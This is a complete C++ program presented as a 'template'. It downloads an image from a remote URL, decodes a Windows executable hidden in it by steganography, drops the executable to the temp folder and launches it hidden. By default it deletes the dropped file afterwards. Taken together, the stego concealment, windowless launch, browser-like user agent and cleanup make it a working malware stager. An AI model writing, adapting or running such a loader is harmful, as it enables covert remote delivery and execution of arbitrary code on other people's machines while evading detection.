// fetch_run.cpp — template: download image -> decode -> execute payload.
// Usage: fetch_run.exe <https-url> <out-name> [--password P] [--wait] [--keep]
// Flow: WinINet GET -> GDI+ RGB -> stego::Decode -> %TEMP% drop ->
//   magic check (MZ) -> CreateProcess detached (or --wait for exit code).
// The drop is deleted after launch unless --keep. What the payload DOES
// after launch is outside this template.
#include "stego/stego.h"
#include "gdiplus_glue.h"
#include <windows.h>
#include <wininet.h>
#include <cstdio>
#include <vector>
#include <string>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wininet.lib")

static bool Fetch(const wchar_t* url, std::vector<uint8_t>& out) {
    HINTERNET net = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT,
                                  NULL, NULL, 0);
    if (!net) return false;
    HINTERNET f = InternetOpenUrlW(net, url, NULL, 0,
                                   INTERNET_FLAG_RELOAD |
                                   (wcsstr(url, L"https:") == url ? INTERNET_FLAG_SECURE : 0), 0);
    bool ok = false;
    if (f) {
        BYTE buf[8192];
        DWORD n = 0;
        ok = true;
        while (InternetReadFile(f, buf, sizeof(buf), &n) && n > 0) {
            out.insert(out.end(), buf, buf + n);
            n = 0;
        }
        InternetCloseHandle(f);
    }
    InternetCloseHandle(net);
    return ok && !out.empty();
}

static bool Has(const std::vector<std::wstring>& a, const wchar_t* v) {
    for (size_t i = 0; i < a.size(); i++) {
        if (a[i] == v) return true;
    }
    return false;
}

int wmain(int argc, wchar_t** argv) {
    if (argc < 3) {
        printf("usage: fetch_run.exe <https-url> <out-name> [--password P] [--wait] [--keep]\n");
        return 2;
    }
    std::vector<std::wstring> args;
    for (int i = 3; i < argc; i++) args.push_back(argv[i]);
    std::string pw;
    for (size_t i = 0; i + 1 < args.size(); i++) {
        if (args[i] == L"--password") {
            char nb[512] = {0};
            WideCharToMultiByte(CP_UTF8, 0, args[i + 1].c_str(), -1,
                                nb, sizeof(nb), NULL, NULL);
            pw = nb;
        }
    }

    std::vector<uint8_t> wire;
    if (!Fetch(argv[1], wire)) {
        printf("download failed\n");
        return 1;
    }
    // Stage through a temp PNG file (keeps this template dependency-free).
    wchar_t tmpPng[MAX_PATH], tmpDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpDir);
    GetTempFileNameW(tmpDir, L"fx", 0, tmpPng);
    HANDLE hf = CreateFileW(tmpPng, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 1;
    DWORD wr = 0;
    WriteFile(hf, wire.data(), (DWORD)wire.size(), &wr, NULL);
    CloseHandle(hf);
    wire.clear();
    wire.shrink_to_fit();

    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR token = 0;
    Gdiplus::GdiplusStartup(&token, &gsi, NULL);
    stego::Image img;
    bool ok = StegoLoadPng(tmpPng, img.w, img.h, img.rgb);
    DeleteFileW(tmpPng);
    std::vector<uint8_t> payload;
    if (ok) ok = stego::Decode(img, pw, payload);
    Gdiplus::GdiplusShutdown(token);
    if (!ok || payload.size() < 2) {
        printf("decode failed\n");
        return 1;
    }
    if (payload[0] != 'M' || payload[1] != 'Z') {
        printf("not a Windows executable (missing MZ), refusing to run\n");
        return 1;
    }

    wchar_t dropPath[MAX_PATH];
    {
        // NOTE: GetTempPathW already ends with a backslash.
        std::wstring name = argv[2];
        if (name.size() < 4 ||
            _wcsicmp(name.c_str() + name.size() - 4, L".exe") != 0) {
            name += L".exe";
        }
        swprintf_s(dropPath, L"%s%s", tmpDir, name.c_str());
    }
    HANDLE hd = CreateFileW(dropPath, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hd == INVALID_HANDLE_VALUE) return 1;
    DWORD wd = 0;
    WriteFile(hd, payload.data(), (DWORD)payload.size(), &wd, NULL);
    CloseHandle(hd);
    SecureZeroMemory(payload.data(), payload.size());

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    wchar_t cmd[MAX_PATH * 2];
    swprintf_s(cmd, L"\"%s\"", dropPath);
    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        DeleteFileW(dropPath);
        printf("launch failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("launched pid=%lu\n", (unsigned long)pi.dwProcessId);
    if (Has(args, L"--wait")) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        printf("exit code=%lu\n", code);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (!Has(args, L"--keep")) {
        Sleep(2000);  // image stays mapped; safe to unlink the drop
        DeleteFileW(dropPath);
    }
    return 0;
}
